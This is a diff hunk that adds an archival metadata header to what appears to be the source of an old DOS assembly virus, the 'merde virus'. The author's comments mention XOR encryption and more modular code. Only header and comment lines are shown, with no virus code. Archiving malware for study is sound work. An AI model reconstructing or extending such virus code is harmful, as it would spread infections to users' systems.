@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      M
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 ;well, here's the next installment of the merde virus...all that is new;
 ;is your run of the mill xor encryption........and a little change in;
 ;the code itself to make it slightly more modular...;
